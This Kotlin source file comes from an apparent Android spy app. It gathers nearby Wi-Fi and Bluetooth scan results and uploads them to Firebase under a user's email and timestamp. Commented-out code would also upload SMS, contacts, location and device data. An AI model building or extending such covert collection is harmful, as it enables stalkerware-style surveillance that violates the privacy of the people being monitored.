package com.komnacki.androidspyapp

import android.content.Context
import android.util.Log
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.Task
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.komnacki.androidspyapp.contacts.ContactsState
import com.komnacki.androidspyapp.device.battery.BatteryState
import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
import com.komnacki.androidspyapp.device.config.ConfigState
import com.komnacki.androidspyapp.device.device.DeviceState
import com.komnacki.androidspyapp.device.location.LocationState
import com.komnacki.androidspyapp.device.memory.MemoryState
import com.komnacki.androidspyapp.device.network.NetworkState
import com.komnacki.androidspyapp.device.nfc.NFCState
import com.komnacki.androidspyapp.sms.SmsState
import github.nisrulz.easydeviceinfo.base.EasyConfigMod
import java.text.SimpleDateFormat
import java.util.*

class MessageUtils {
    private val BATTERY_DATABASE_TAG = "BATTERY"
    private val BLUETOOTH_DATABASE_TAG = "BLUETOOTH"
    private val CONFIG_DATABASE_TAG = "CONFIG"
    private val NETWORK_DATABASE_TAG = "NETWORK"
    private val MEMORY_DATABASE_TAG = "MEMORY"
    private val DEVICE_DATABASE_TAG = "DEVICE"
    private val NFC_DATABASE_TAG = "NFC"
    private val LOCATION_DATABASE_TAG = "LOCATION"
    private val SMS_DATABASE_TAG = "SMS"
    private val CONTACTS_DATABASE_TAG = "CONTACTS"
    private val WIFI_LIST_DATABASE_TAG = "WIFI_LIST"
    private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"

    companion object {
        lateinit var userEmail: String
        lateinit var context: Context
        fun getInstance(context: Context, userEmail: String): MessageUtils {
            this.context = context
            this.userEmail = userEmail
            return MessageUtils()
        }
    }

    fun getBaseHeader(): DatabaseReference {
        val easyConfigMode = EasyConfigMod(context)
        val currDate = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
        val currTime = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        Log.d("KK: ", "currDate: " + currDate)
        Log.d("KK: ", "currTime: " + currTime)


        return FirebaseDatabase.getInstance().reference
            .child(userEmail)
            .child(currDate)
            .child(currTime)
    }

    fun sendData(
        wifiScanResult: List<WifiScanResult>?,
        bluetoothScanResult: List<BluetoothScanResult>?
    ) {
        val batteryState = BatteryState(context)
        val bluetoothState = BluetoothState(context)
        val configState = ConfigState(context)
        val networkState = NetworkState(context)
        val memoryState = MemoryState(context)
        val deviceState = DeviceState(context)
        val nfcState = NFCState(context)
        val locationState = LocationState(context)
        val smsState = SmsState(context)
        val contactsState = ContactsState(context)


        val values = mutableMapOf<String, Any>()

        /*Log.d("KK: ", "write battery")
        batteryState.getData().forEach { item ->
            values[BATTERY_DATABASE_TAG + "/" + item.key] = item.value
        }

        Log.d("KK: ", "write bluetooth")
        bluetoothState.getData().forEach { item ->
            values[BLUETOOTH_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write config")
        configState.getData().forEach { item ->
            values[CONFIG_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write network")
        networkState.getData().forEach { item ->
            values[NETWORK_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write memory")
        memoryState.getData().forEach { item ->
            values[MEMORY_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write device")
        deviceState.getData().forEach { item ->
            values[DEVICE_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write nfc")
        nfcState.getData().forEach { item ->
            values[NFC_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write location")
        locationState.getData().forEach { item ->
            values[LOCATION_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write sms")
        smsState.getData().forEach { item ->
            values[SMS_DATABASE_TAG + "/" + item.key] = item.value
        }
        Log.d("KK: ", "write contacts")
        contactsState.getData().forEach { item ->
            values[CONTACTS_DATABASE_TAG + "/" + item.key] = item.value
        }*/
        Log.d("KK: ", "write wifi")
        if (!wifiScanResult.isNullOrEmpty()) {
            Log.d("KK: ", "wifiScanResult is not empty")
            wifiScanResult.forEach { scan ->
                Log.d("KK: ", "wifiScanResult for each: " + scan.getWifiName())
                val wifiNetwork = scan.getData()
                wifiNetwork.forEach { item ->
                    values[WIFI_LIST_DATABASE_TAG + "/" + normalizeName(scan.getWifiName()) + "/" + normalizeName(item.key)] = item.value
                }
            }
        } else {
            values["$WIFI_LIST_DATABASE_TAG/Empty"] = ""
        }

        if(!bluetoothScanResult.isNullOrEmpty()) {
            bluetoothScanResult.forEach { scan ->
                val bluetoothNetwork = scan.getData()
                bluetoothNetwork.forEach { item ->
                    Log.d("KK: ", "bluetooth key: " + item.key +", " + item.value)
                    values[BLUETOOTH_LIST_DATABASE_TAG + "/" + normalizeName(scan.getBluetoothName()) + "/" + normalizeName(item.key)] = item.value
                }
            }
        } else {
            values["$BLUETOOTH_LIST_DATABASE_TAG/Empty"] = ""
        }

        Log.d("KK: ", "updateChildren")
        getBaseHeader().updateChildren(values)
            .addOnCompleteListener(object : OnCompleteListener<Void> {
                override fun onComplete(p0: Task<Void>) {
                    Log.d("KK: ", "update childrens complete!")
                }
            })
//        val transactionHandler = object : Transaction.Handler {
//            override fun onComplete(p0: DatabaseError?, p1: Boolean, p2: DataSnapshot?) {
//                Log.d("KK: ", "onComplete transaction")
//            }
//
//            override fun doTransaction(p0: MutableData): Transaction.Result {
//                p0.child(BATTERY_DATABASE_TAG)
//                batteryState.getData(context).forEach { item ->
//                    Log.d("KK: ", "for each: " + item.toString())
//                    p0.child(item.key).value = item.value
//                }
//                p0.
//
//                return Transaction.success(p0)
//            }
//        }
//
//        getBaseHeader()
//            .runTransaction(transactionHandler)
    }

    fun normalizeName(name: String): String {
        return name
            .replace("/", " ")
            .replace("#", " ")
            .replace("\\", " ")
            .replace(",", " ")
            .replace(".", " ")
            .replace("(", " ")
            .replace(")", " ")
            .replace("!", " ")
            .replace("[", " ")
            .replace("]", " ")
            .replace(" ", "_")
//            .replace("ą", "a")
//            .replace("ę", "e")
//            .replace("ó", "o")
//            .replace("ś", "s")
//            .replace("ł", "l")
//            .replace("ż", "z")
//            .replace("ź", "z")
//            .replace("ć", "c")
//            .replace("ń", "n")
//            .replace("Ą", "A")
//            .replace("Ę", "E")
//            .replace("Ó", "O")
//            .replace("Ś", "S")
//            .replace("Ł", "L")
//            .replace("Ż", "Z")
//            .replace("Ź", "Z")
//            .replace("Ć", "C")
//            .replace("Ń", "N")
    }
}